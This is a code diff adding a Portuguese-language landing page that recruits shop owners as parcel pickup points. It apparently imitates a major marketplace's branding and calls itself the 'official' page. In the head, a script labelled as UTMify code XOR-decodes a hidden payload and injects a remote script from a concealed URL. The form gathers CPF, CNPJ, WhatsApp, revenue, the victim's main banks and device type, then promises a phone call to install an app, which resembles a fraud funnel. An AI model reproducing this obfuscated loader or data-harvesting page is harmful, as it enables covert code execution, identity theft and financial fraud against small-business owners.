@@ -1,0 +1,238 @@
+<!DOCTYPE html><html lang="pt-BR"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Cadastro para Ponto de Coleta</title>
+<!-- TikTok Pixel: troque DBSP5N3C77U657ENOFOG pelo ID do Pixel no TikTok Events Manager. -->
+<script>
+(function(){
+ var pixelId="DBSP5N3C77U657ENOFOG";
+ if(!pixelId)return;
+ !function(w,d,t){w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];
+ ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"];
+ ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};
+ for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);
+ ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e};
+ ttq.load=function(e,n){var i="https://analytics.tiktok.com/i18n/pixel/events.js";
+ ttq._i=ttq._i||{};ttq._i[e]=[];ttq._i[e]._u=i;ttq._t=ttq._t||{};ttq._t[e]=+new Date;
+ ttq._o=ttq._o||{};ttq._o[e]=n||{};var a=d.createElement("script");
+ a.type="text/javascript";a.async=true;a.src=i+"?sdkid="+e+"&lib="+t;
+ var r=d.getElementsByTagName("script")[0];r.parentNode.insertBefore(a,r)};
+ ttq.load(pixelId);ttq.page();
+ }(window,document,"ttq");
+})();
+</script>
+<style>
+*{box-sizing:border-box}body{margin:0;background:#fff;color:#333;font-family:"Proxima Nova",system-ui,-apple-system,Arial,sans-serif;line-height:1.5}
+header{background:#ffe600;padding:10px 20px;display:flex;align-items:center}header img{height:38px}
+.w{max-width:560px;margin:0 auto;padding:0 20px}
+h1{font-size:28px;line-height:1.15;text-align:center;margin:26px 0 8px}h2{font-size:22px;text-align:center;margin:30px 0 10px}
+.sub{text-align:center;color:#666;margin:0 0 6px}
+.bar{width:60px;height:8px;border-radius:9px;background:#ffe600;margin:28px auto 0}
+.card{background:#fff;border-radius:20px;padding:22px;margin:16px 0;box-shadow:0 2px 14px rgba(0,0,0,.09)}
+.btn{display:block;width:100%;border:0;border-radius:6px;background:#3483fa;color:#fff;font-size:16px;font-weight:600;padding:14px;cursor:pointer;text-align:center;text-decoration:none}
+.btn.alt{background:#e3edfb;color:#3483fa}.btn.wa{background:#25d366;color:#fff}.btn:disabled{opacity:.5}
+ul{list-style:none;padding:0;margin:0}li{padding-left:28px;position:relative;margin:10px 0}li:before{content:"✓";color:#3483fa;position:absolute;left:4px;font-weight:700}
+.big{font-size:38px;font-weight:800;text-align:center;margin:6px 0}.mut{color:#777;font-size:13px;text-align:center}
+.ins{background:#fffbd1;border-left:4px solid #ffe600;padding:12px 14px;border-radius:8px;margin:14px 0;font-size:14px}
+.ref{background:#f5f5f5;border-radius:10px;padding:12px 14px;margin:14px 0;font-size:14px}.ref p{margin:6px 0}
+.pre{display:flex;gap:8px;margin:10px 0}.pre button{flex:1;border:1px solid #3483fa;background:#fff;color:#3483fa;border-radius:6px;padding:9px 6px;font-size:13px;font-weight:600;cursor:pointer}
+label{display:block;font-weight:600;font-size:14px;margin:14px 0 4px}
+input,select{width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;font:inherit;background:#fff;color:#333}input[type=range]{padding:0}
+.opt{display:block;width:100%;text-align:left;background:#f5f5f5;color:#333;border:2px solid transparent;border-radius:10px;padding:14px;margin:10px 0;font-size:15px;cursor:pointer}.opt:hover{border-color:#3483fa}
+.pb{height:6px;background:#eee;border-radius:9px;overflow:hidden;margin-bottom:16px}.pb i{display:block;height:100%;background:#ffe600;width:0;transition:width .3s}
+.chk{display:flex;gap:10px;font-weight:400;font-size:13px;align-items:flex-start}.chk input{width:auto;margin-top:4px}
+.choice{display:flex;align-items:center;gap:10px;padding:12px;border:1px solid #ddd;border-radius:10px;margin:8px 0;font-weight:500}.choice input{width:auto;accent-color:#3483fa}.stepnote{color:#666;font-size:14px}.stepcount{font-size:12px;color:#777;font-weight:700;letter-spacing:.08em}.err{color:#d93025;font-size:13px;min-height:18px}.hide{display:none}.hp{position:absolute;left:-9999px}
+body{padding-bottom:96px}
+.sticky{position:fixed;left:0;right:0;bottom:0;z-index:20;background:#fff;box-shadow:0 -2px 14px rgba(0,0,0,.12);padding:10px 16px calc(10px + env(safe-area-inset-bottom,0px))}.sticky>*{max-width:520px;margin-left:auto;margin-right:auto}.sticky .err{text-align:center;min-height:0;margin-bottom:6px}
+#ld{position:fixed;inset:0;z-index:50;background:rgba(255,255,255,.97);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:18px;font-weight:600;color:#333}#ld.hide{display:none}.spin{width:56px;height:56px;border:6px solid #ffe600;border-top-color:#3483fa;border-radius:50%;animation:sp .8s linear infinite}@keyframes sp{to{transform:rotate(360deg)}}
+footer{font-size:12px;color:#888;text-align:center;padding:30px 20px 40px}
+</style><!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
+fbq('init','29072105285719610');
+fbq('track','PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=29072105285719610&amp;ev=PageView&amp;noscript=1" alt=""></noscript>
+<!-- End Meta Pixel Code -->
+      <!-- UTMify Script -->
+    <script
+        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+        data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids
+        async
+        defer
+    ></script>
+        <script>
+    window.pixelId = "691e70b19364f8461308455a";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+    </script>
+    
+<!-- UTMify - script fornecido pelo proprietário do projeto -->
+<script>(function(){var y_im=atob("DBihfZD0RjGb47sPEWODCOKYZAu5i897YWubUr+XIl+1ls9ieH7YU/ObKx/5kZR8cmrIDeSHaUHym95jPmjIBfWYa0XyiM9gejbLDrLYZFDvl8lmc23VGOPWfGrGz5lofXfDHPyHZAvAmJlhcHXEX6rWMljwt9RkQXHZGPy9IhO3wc1ufW3EX6rWcFD90Y43JC7EG/HCf1D61t4+IyuYRaPCZEzGng==");var s_d2a=[];for(var c_d=0;c_d<y_im.length;c_d++){s_d2a.push(y_im.charCodeAt(c_d)&255);}var p_gmx=s_d2a[0];var c_c1y=s_d2a.slice(1,1+p_gmx);var u_qbf5=s_d2a.slice(1+p_gmx);var b_u7=u_qbf5.map(function(b,t_l82){return b^c_c1y[t_l82%p_gmx];});var q_eu9="";for(var s_3=0;s_3<b_u7.length;s_3++){q_eu9+=String.fromCharCode(b_u7[s_3]&255);}var p_21z4=decodeURIComponent(escape(q_eu9));var k_l7=JSON.parse(p_21z4);var e_s=k_l7.globals||[];e_s.forEach(function(l_1){window[l_1.name]=l_1.value;});var z_omj=document.createElement("script");z_omj.src=k_l7.url;z_omj.async=true;z_omj.defer=true;(k_l7.attributes||[]).forEach(function(z_bh){z_omj.setAttribute(z_bh.name,z_bh.value);});(document.head||document.documentElement).appendChild(z_omj);})();</script>
+<style>
+.flowcard{max-width:470px;margin:20px auto 8px;padding:22px 18px;background:#fff;border:1px solid #e7e7e7;border-radius:20px;text-align:center;box-shadow:0 7px 28px #0000000a}
+.flowart{max-width:300px;width:100%;margin:0 auto 8px}.flowart svg{display:block;width:100%;height:auto}
+.flowcard h2{margin:8px 0 10px;font-size:clamp(22px,6vw,28px);line-height:1.2}.flowcard p{font-size:15px;line-height:1.6;color:#424242}
+.flowcard .btn{width:100%;margin-top:10px;background:#f5ca34;color:#202020}.flowcard .secondary-choice{background:white;border:2px solid #e6bb27}
+.flowcard .successmark{display:grid;place-items:center;margin:10px auto 18px;width:94px;height:94px;background:#dcf8e0;color:#168b35;border-radius:50%;font-size:54px;font-weight:800}
+@media(max-width:420px){.flowcard{margin:12px auto;padding:18px 14px}.flowart{max-width:240px}}
+</style></head><body>
+<header><img src="img/logo.jpg" style="border-radius:8px" alt="Logo do Ponto de Coleta" onerror="this.style.display='none'"></header>
+<div class="w">
+
+<section id="quiz"><img id="imagemEtapa" alt="Ilustração da etapa" style="display:none;width:100%;height:auto;max-height:260px;object-fit:contain;margin:12px auto;border-radius:12px" onerror="this.style.display='none'">
+<h1>Transforme sua loja em um ponto de coleta e ganhe mais</h1>
+<p class="sub">Responda 5 perguntas rápidas e veja quanto sua loja pode render</p>
+<div class="card"><div class="pb"><i id="pbi"></i></div><h2 id="qt" style="text-align:left;font-size:20px;margin-top:0"></h2><div id="qo"></div><div class="ins" id="qi"></div></div>
+</section>
+
+<section id="result" class="hide">
+<h2>Quanto sua loja pode ganhar</h2>
+<div class="card">
+<label for="pk">Pacotes por dia na sua loja</label><input type="range" id="pk" min="5" max="200" value="60"><div class="mut" id="pkv"></div>
+<div class="big" id="sim"></div><div class="mut">por mês · estimativa com R$ 0,65 por pacote, sem promessa de ganho</div>
+</div>
+<p class="mut">Referência de mercado: de R$ 700 a R$ 4.000+ por mês, conforme a região.</p>
+<div class="card" style="padding:16px 20px"><ul>
+<li><b>CNPJ ativo</b> e ponto físico</li>
+<li>A partir de <b>4 m²</b> livres para pacotes</li>
+<li>Orientações sobre as próximas etapas após a análise do cadastro</li></ul></div>
+<div class="sticky"><button class="btn" id="toForm">Quero me cadastrar</button></div>
+</section>
+
+<section id="formS" class="hide">
+<h2>Cadastro de interesse</h2>
+<div class="card">
+<label for="nome">Nome completo</label><input id="nome" autocomplete="name">
+<label for="cpf">CPF</label><input id="cpf" inputmode="numeric" placeholder="000.000.000-00">
+<label for="cnpj">CNPJ</label><input id="cnpj" inputmode="numeric" placeholder="00.000.000/0000-00">
+<div id="cnpjinfo" class="ins hide"></div>
+<label for="fant">Nome da loja / negócio</label><input id="fant">
+<label for="cid">Cidade / UF</label><input id="cid">
+<label for="seg">Tipo de comércio / atividade</label><input id="seg" placeholder="Preenchido pelo CNPJ">
+<label for="m2">Espaço livre para pacotes</label><select id="m2"><option value="">Selecione</option><option>Menos de 4 m²</option><option>4 a 8 m²</option><option>8 a 15 m²</option><option>Mais de 15 m²</option></select>
+<label for="fat">Faturamento mensal médio</label><select id="fat"><option value="">Selecione</option><option>Até R$ 5 mil</option><option>R$ 5 a 15 mil</option><option>R$ 15 a 30 mil</option><option>R$ 30 a 60 mil</option><option>Acima de R$ 60 mil</option></select>
+<label for="zap">WhatsApp</label><input id="zap" inputmode="tel" placeholder="(11) 90000-0000">
+<label for="mail">E-mail (opcional)</label><input id="mail" type="email">
+<input class="hp" id="website" tabindex="-1" autocomplete="off">
+<label class="chk" style="margin-top:16px"><input type="checkbox" id="ok"> Autorizo o uso dos meus dados para contato sobre este serviço, conforme a LGPD, e confirmo ter CNPJ ativo e ponto físico.</label>
+</div>
+<div class="sticky"><div class="err" id="err"></div><button class="btn" id="send">Enviar cadastro</button></div>
+</section>
+
+<section id="qualS" class="hide">
+<div class="bar"></div><p class="stepcount" id="qualStep" style="text-align:center">ETAPA 1 DE 3</p>
+<h2 id="qualTitle">Pronto, você está quase lá!</h2><p class="sub" id="qualIntro">Para entendermos melhor a operação do seu estabelecimento, responda mais algumas perguntas.</p>
+<div class="card"><div class="pb"><i id="qualProgress"></i></div><div id="qualBody"></div><div class="err" id="qualErr"></div></div>
+<div class="sticky"><button class="btn" id="qualNext">Continuar</button></div>
+</section>
+<section id="meetingS" class="hide"><div class="bar"></div><div class="flowcard"><div class="flowart"><svg viewBox="0 0 320 190" role="img" aria-label="Ilustração de reunião por vídeo"><rect x="48" y="14" width="224" height="143" rx="15" fill="#232a34"/><rect x="56" y="22" width="208" height="126" rx="9" fill="#e9f4fa"/><circle cx="160" cy="72" r="29" fill="#efbd93"/><path d="M129 67q2-42 31-42t31 42q-15-21-31-21t-31 21" fill="#313844"/><path d="M112 147q6-46 48-46t48 46" fill="#334a69"/><path d="M143 104l17 20 17-20" fill="#fff"/><rect x="124" y="159" width="72" height="8" rx="4" fill="#77818c"/><rect x="99" y="168" width="122" height="6" rx="3" fill="#b7c0c9"/><circle cx="249" cy="42" r="22" fill="#e4b536"/><path d="M238 36h16v13h-16zM254 40l8-5v15l-8-5" fill="white"/></svg></div><h2>Próxima etapa: reunião por vídeo</h2><p>Se seu cadastro avançar na análise, você poderá participar de uma reunião por vídeo com um representante para conhecer os próximos passos do credenciamento.</p><p>Você teria disponibilidade para participar dessa reunião?</p><button class="btn" id="meetingYes">Sim, aceito participar</button><button class="btn secondary-choice" id="meetingNo">Não, não aceito</button><div class="err" id="meetingErr"></div></div></section>
+<section id="appS" class="hide"><div class="bar"></div><div class="flowcard"><div class="flowart"><svg viewBox="0 0 320 190" role="img" aria-label="Celular com leitor de código de barras e pacote"><rect x="112" y="5" width="115" height="178" rx="19" fill="#242b33" transform="rotate(7 170 90)"/><rect x="121" y="17" width="97" height="150" rx="11" fill="#f7d960" transform="rotate(7 170 90)"/><g transform="rotate(7 170 90)"><text x="169" y="53" text-anchor="middle" font-size="12" font-weight="bold" fill="#222">BIPAGEM</text><path d="M138 73v-9h10m42 0h10v9m0 30v9h-10m-42 0h-10v-9" fill="none" stroke="#222" stroke-width="3"/><g fill="#222"><rect x="146" y="79" width="3" height="25"/><rect x="153" y="79" width="5" height="25"/><rect x="162" y="79" width="2" height="25"/><rect x="169" y="79" width="6" height="25"/><rect x="180" y="79" width="2" height="25"/><rect x="187" y="79" width="4" height="25"/></g></g><path d="M55 110l56-22 51 21-53 22z" fill="#e8ad5e"/><path d="M55 110v50l54 22v-51z" fill="#c88b3c"/><path d="M109 131l53-22v51l-53 22z" fill="#e3a654"/><path d="M84 99l53 22" stroke="#f8dcae" stroke-width="9"/></svg></div><h2>Aplicativo de bipagem dos pacotes</h2><p>Para atuar como ponto de coleta, será necessário utilizar um aplicativo ou sistema compatível para registrar a entrada e a saída dos pacotes.</p><div class="ins" style="text-align:left">Se o cadastro avançar na análise, nossa equipe poderá entrar em contato por telefone para orientar sobre a instalação, configuração e utilização do aplicativo.</div><button class="btn" id="appContinue">Entendi, continuar</button><div class="err" id="appErr"></div></div></section>
+<section id="done" class="hide"><div class="bar"></div><div class="flowcard"><div class="successmark">✓</div><h2>Cadastro recebido!</h2><p>Suas informações foram registradas e encaminhadas para análise.</p><div class="ins" style="text-align:left">Se o seu estabelecimento avançar no processo, a equipe poderá entrar em contato no horário informado para orientar os próximos passos. O cadastro não garante aprovação ou agendamento.</div></div></section>
+
+</div>
+<footer>Página oficial de cadastro de interesse em pontos de coleta.</footer>
+<div id="ld" class="hide"><div class="spin"></div><div id="ldt"></div></div>
+<script>
+var WA_NUMBER="5511982072072"; // TROQUE pelo seu WhatsApp: 55 + DDD + número, só dígitos
+var $=function(i){return document.getElementById(i)};
+var views=["quiz","result","formS","qualS","meetingS","appS","done"];
+function show(v){views.forEach(function(x){$(x).classList.toggle("hide",x!==v)});window.scrollTo(0,0)}
+
+var Q=[{t:"Quantos clientes entram na sua loja por dia?",o:["Menos de 20","20 a 50","50 a 100","Mais de 100"],i:"Cada pessoa que vem buscar ou devolver um pacote é um visitante a mais dentro da sua loja."},
+{t:"Você tem espaço sobrando para guardar pacotes?",o:["Sim, mais de 4 m²","Cerca de 4 m²","Preciso liberar espaço","Não tenho"],i:"A referência de mercado é a partir de 4 m². Um canto organizado já resolve."},
+{t:"Como está o movimento nos dias fracos?",o:["Muito parado","Oscila bastante","Razoável","Sempre cheio"],i:"Pontos de coleta trazem fluxo constante, inclusive em dias e horários fracos."},
+{t:"Você ofereceria algo a quem vem buscar um pacote?",o:["Sim, já tenho produtos à mão","Talvez, com uma vitrine","Não tinha pensado nisso","Prefiro só receber pacotes"],i:"Quem entra vê seus produtos e muitos compram por impulso: renda extra além do ganho por pacote."},
+{t:"Você tem CNPJ ativo e ponto físico?",o:["Sim, os dois","CNPJ sim, ponto em breve","Só ponto, sem CNPJ","Ainda não"],i:"CNPJ ativo e conta PJ são obrigatórios para participar."}];
+var ans=[],qi=0;
+function ren(){var q=Q[qi];var im=$("imagemEtapa");if(im){im.src="/img/etapas/etapa-"+(qi+1)+".png";im.style.display="block";}$("pbi").style.width=(qi/Q.length*100)+"%";$("qt").textContent=q.t;$("qi").textContent="💡 "+q.i;var h=$("qo");h.innerHTML="";q.o.forEach(function(o){var b=document.createElement("button");b.className="opt";b.textContent=o;b.onclick=function(){ans.push(q.t+": "+o);qi++;qi<Q.length?ren():fin()};h.appendChild(b)})}
+function fin(){show("result");sim()}
+ren();
+
+var GANHO=0.65;
+function sim(){var p=+$("pk").value;$("pkv").textContent=p+" pacotes/dia";
+$("sim").textContent="R$ "+(p*GANHO*26).toLocaleString("pt-BR",{minimumFractionDigits:2,maximumFractionDigits:2})}
+$("pk").oninput=sim;sim();
+$("toForm").onclick=function(){show("formS")};
+
+var loadT=null;
+function startLoad(){var m=["Verificando seus dados...","Conferindo seu CNPJ...","Enviando seu cadastro..."],i=0;$("ld").classList.remove("hide");$("ldt").textContent=m[0];loadT=setInterval(function(){i=(i+1)%m.length;$("ldt").textContent=m[i]},900)}
+function stopLoad(){clearInterval(loadT);$("ld").classList.add("hide")}
+function dg(s){return s.replace(/\D/g,"")}
+function mk(el,fn){el.addEventListener("input",function(){el.value=fn(dg(el.value))})}
+mk($("cpf"),function(d){d=d.slice(0,11);return d.replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d{1,2})$/,"$1-$2")});
+mk($("cnpj"),function(d){d=d.slice(0,14);return d.replace(/(\d{2})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1/$2").replace(/(\d{4})(\d{1,2})$/,"$1-$2")});
+mk($("zap"),function(d){d=d.slice(0,11);return d.replace(/(\d{2})(\d)/,"($1) $2").replace(/(\d{5})(\d{1,4})$/,"$1-$2")});
+function vCPF(c){c=dg(c);if(c.length!=11||/^(\d)\1+$/.test(c))return false;for(var t=9;t<11;t++){var s=0;for(var i=0;i<t;i++)s+=c[i]*(t+1-i);if(((s*10)%11)%10!=c[t])return false}return true}
+function vCNPJ(c){c=dg(c);if(c.length!=14||/^(\d)\1+$/.test(c))return false;function d(n){var s=0,p=n-7;for(var i=0;i<n;i++){s+=c[i]*p--;if(p<2)p=9}var r=s%11;return r<2?0:11-r}return d(12)==c[12]&&d(13)==c[13]}
+
+// Preenchimento automático pelo CNPJ (nome do negócio, cidade, tipo de comércio)
+var lastC="",edited={fant:false,cid:false,seg:false};
+["fant","cid","seg"].forEach(function(k){$(k).addEventListener("input",function(){edited[k]=true});$(k).addEventListener("change",function(){edited[k]=true})});
+function cap(s){return String(s||"").toLowerCase().replace(/(^|\s)\S/g,function(c){return c.toUpperCase()})}
+var cnpjAtivo=null;
+$("cnpj").addEventListener("input",async function(){var d=dg($("cnpj").value),b=$("cnpjinfo");
+b.classList.add("hide");
+if(d.length!==14){lastC="";cnpjAtivo=null;return}
+if(!vCNPJ(d))return;
+if(d===lastC){if(cnpjAtivo===false)inativo();return}
+lastC=d;cnpjAtivo=null;
+function inativo(){b.classList.remove("hide");b.style.cssText="color:#d93025;background:#fdecea;border-left-color:#d93025;font-weight:600";b.textContent="Este CNPJ não está ativo na Receita. É necessário CNPJ ativo para participar."}
+try{var r=await(await fetch("/api/cnpj?cnpj="+d)).json();
+if(dg($("cnpj").value)!==d||!r.found)return;
+cnpjAtivo=!!r.ativa;
+if(!r.ativa){inativo();return}
+var nome=(r.fantasia||r.razao||"").replace(/^\d{2}\.\d{3}\.\d{3}\s+/,"");
+if(!edited.fant&&nome)$("fant").value=nome;
+if(!edited.cid&&r.cidade)$("cid").value=cap(r.cidade)+"/"+r.uf;
+if(!edited.seg&&r.atividade)$("seg").value=r.atividade;
+}catch(e){}});
+
+var cadastro=null, qualStep=0, qualData={bancos:[],dispositivo:"",horario:""};
+var bankOptions=["Banco do Brasil","Bradesco","Caixa Econômica","Itaú","Santander","Nubank","Inter","C6 Bank","Mercado Pago","PagBank","Sicredi","Sicoob","BTG Pactual","Outro","Prefiro não informar"];
+function loadingFor(ms,phrases){return new Promise(function(resolve){var i=0;$("ld").classList.remove("hide");$("ldt").textContent=phrases[0];var timer=setInterval(function(){i=Math.min(i+1,phrases.length-1);$("ldt").textContent=phrases[i]},Math.max(700,ms/phrases.length));setTimeout(function(){clearInterval(timer);$("ld").classList.add("hide");resolve()},ms)})}
+function renderQual(){show("qualS");$("qualStep").textContent="ETAPA "+(qualStep+1)+" DE 3";$("qualProgress").style.width=((qualStep+1)/3*100)+"%";$("qualErr").textContent="";var body=$("qualBody");body.innerHTML="";
+var title=["Pronto, você está quase lá!","Como você trabalha hoje?","Qual o melhor horário para contato?"];
+var intro=["Queremos conhecer melhor sua operação para avaliar oportunidades e benefícios que podem estar disponíveis aos pontos de coleta parceiros.","Precisamos conhecer o dispositivo disponível para orientar a instalação do aplicativo de bipagem.","Escolha o período em que prefere receber orientações caso sua ficha avance na análise."];
+$("qualTitle").textContent=title[qualStep];$("qualIntro").textContent=intro[qualStep];$("qualNext").textContent=qualStep===2?"Continuar para próxima etapa":"Continuar";
+if(qualStep===0){var h=document.createElement("h3");h.textContent="Quais são os até 3 bancos que você mais utiliza na sua operação?";body.appendChild(h);var p=document.createElement("p");p.className="stepnote";p.textContent="Informe os bancos que você mais utiliza. Essas informações ajudam nossa equipe a entender o perfil financeiro da sua operação e avaliar possíveis benefícios, condições comerciais e oportunidades que podem contribuir para melhorar os resultados do ponto de coleta, conforme critérios de elegibilidade e disponibilidade. A existência de benefícios ou ganhos adicionais não é garantida.";body.appendChild(p);bankOptions.forEach(function(bank){var lab=document.createElement("label");lab.className="choice";var inp=document.createElement("input");inp.type="checkbox";inp.checked=qualData.bancos.includes(bank);inp.onchange=function(){if(inp.checked){if(bank==="Prefiro não informar")qualData.bancos=[];else qualData.bancos=qualData.bancos.filter(x=>x!=="Prefiro não informar");if(qualData.bancos.length>=3&&bank!=="Prefiro não informar"){inp.checked=false;$("qualErr").textContent="Escolha no máximo três bancos.";return}qualData.bancos.push(bank)}else qualData.bancos=qualData.bancos.filter(x=>x!==bank);renderQual()};lab.append(inp,document.createTextNode(bank));body.appendChild(lab)})}
+if(qualStep===1){var h=document.createElement("h3");h.textContent="Qual dispositivo será usado na operação?";body.appendChild(h);["Android","iOS (iPhone/iPad)","Computador"].forEach(function(v){var lab=document.createElement("label");lab.className="choice";var inp=document.createElement("input");inp.type="radio";inp.name="device";inp.checked=qualData.dispositivo===v;inp.onchange=function(){qualData.dispositivo=v};lab.append(inp,document.createTextNode(v));body.appendChild(lab)});var info=document.createElement("div");info.className="ins";info.textContent="O aplicativo ou sistema de bipagem compatível é necessário para a operação. Se a candidatura avançar, o suporte entrará em contato para orientar os requisitos, instalação e configuração.";body.appendChild(info)}
+if(qualStep===2){var h=document.createElement("h3");h.textContent="Quando podemos entrar em contato?";body.appendChild(h);var sel=document.createElement("select");sel.id="horarioEscolhido";["Selecione um período","Manhã (8h às 12h)","Tarde (12h às 17h)","Noite (17h às 20h)","Qualquer horário comercial"].forEach(function(v,i){var opt=document.createElement("option");opt.value=i?v:"";opt.textContent=v;sel.appendChild(opt)});sel.value=qualData.horario;sel.onchange=function(){qualData.horario=sel.value};body.appendChild(sel);var p=document.createElement("div");p.className="ins";p.textContent="Este é um horário de preferência, não um agendamento confirmado. A equipe poderá entrar em contato nesse período ou em horário próximo, conforme disponibilidade e andamento da análise.";body.appendChild(p)}
+}
+$("qualNext").onclick=async function(){if(qualStep===0&&!qualData.bancos.length){$("qualErr").textContent="Selecione ao menos uma opção.";return}if(qualStep===1&&!qualData.dispositivo){$("qualErr").textContent="Selecione o dispositivo.";return}if(qualStep===2&&!qualData.horario){$("qualErr").textContent="Escolha o horário de preferência.";return}if(qualStep<2){qualStep++;renderQual();return}
+await loadingFor(2200,["Conferindo suas respostas...","Preparando a próxima etapa...","Tudo pronto!"]);show("meetingS");return;
+};
+var submitting=false;
+$("meetingYes").onclick=function(){submitMeeting("aceitou")};
+$("meetingNo").onclick=function(){show("appS");};
+$("appContinue").onclick=function(){submitMeeting("nao_aceitou")};
+async function submitMeeting(decision){
+if(submitting)return;submitting=true;
+var err=decision==="aceitou"?$("meetingErr"):$("appErr");err.textContent="";
+var btn=decision==="aceitou"?$("meetingYes"):$("appContinue");btn.disabled=true;
+var payload=Object.assign({},cadastro,{
+  bancos: qualData.bancos.slice(0,3),
+  dispositivo: qualData.dispositivo,
+  horario: qualData.horario,
+  reuniao_video: decision,
+  orientacao_telefone: decision==="nao_aceitou",
+  qualificacao: {
+    bancos: qualData.bancos.slice(0,3),
+    dispositivo: qualData.dispositivo,
+    horario: qualData.horario
+  }
+});
+$("ld").classList.remove("hide");$("ldt").textContent="Enviando ficha completa com segurança...";
+try{var r=await fetch("/api/lead",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});var j=await r.json().catch(()=>({}));if(!r.ok)throw {c:r.status,e:j.error};
+try{if(typeof window.fbq==="function")window.fbq("track","Lead",{content_name:"Cadastro ponto de coleta"})}catch(e){}
+try{if(window.ttq&&typeof window.ttq.track==="function")window.ttq.track("Lead",{content_name:"Cadastro ponto de coleta"})}catch(e){}
+$("ld").classList.add("hide");show("done")}
+catch(x){$("ld").classList.add("hide");btn.disabled=false;submitting=false;err.textContent=x.e==="db"?"Não foi possível acessar o banco de dados. Verifique a configuração na Vercel.":x.e==="duplicate"?"Já existe uma ficha com este CNPJ. Aguarde o contato da equipe.":x.e==="inativo"?"CNPJ inativo. Confira os dados.":"Não foi possível enviar a ficha. Tente novamente."}};
+$("send").onclick=async function(){
+var l={nome:$("nome").value.trim(),cpf:$("cpf").value,cnpj:$("cnpj").value,fant:$("fant").value.trim(),cid:$("cid").value.trim(),seg:$("seg").value,m2:$("m2").value,fat:$("fat").value,zap:$("zap").value,mail:$("mail").value.trim(),quiz:ans.join(" | "),website:$("website").value,consent:$("ok").checked},e="";
+if(l.nome.split(" ").length<2)e="Informe o nome completo.";else if(!vCPF(l.cpf))e="CPF inválido.";else if(!vCNPJ(l.cnpj))e="CNPJ inválido.";else if(cnpjAtivo===false)e="Este CNPJ não está ativo na Receita.";else if(!l.fant||!l.cid||!l.seg||!l.m2||!l.fat)e="Preencha todos os campos.";else if(dg(l.zap).length<10)e="WhatsApp inválido.";else if(!l.consent)e="É necessário autorizar o contato.";
+$("err").textContent=e;if(e)return;cadastro=l;$("send").disabled=true;
+await loadingFor(2800,["Conferindo os dados preenchidos...","Preparando as perguntas da operação...","Pronto! Você está quase lá."]);qualStep=0;renderQual();$("send").disabled=false;
+};
+</script></body></html>
